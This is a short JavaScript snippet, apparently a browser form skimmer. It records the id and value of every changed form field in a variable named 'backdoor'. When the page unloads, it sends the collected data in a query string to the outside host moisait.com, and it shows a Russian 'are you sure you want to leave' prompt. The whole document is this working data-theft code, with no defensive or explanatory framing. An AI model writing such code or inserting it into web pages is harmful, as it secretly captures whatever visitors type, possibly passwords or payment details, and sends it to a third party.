let backdoor = ''


document.addEventListener('change', (e) => {
  backdoor += JSON.stringify(`${e.target.id} - ${e.target.value}, ${Date.now()}    `)
})


window.onbeforeunload = function(e) {
    fetch(`https://moisait.com?query=${backdoor}`)
    return "Вы уверены, что хотите покинуть страницу?";
};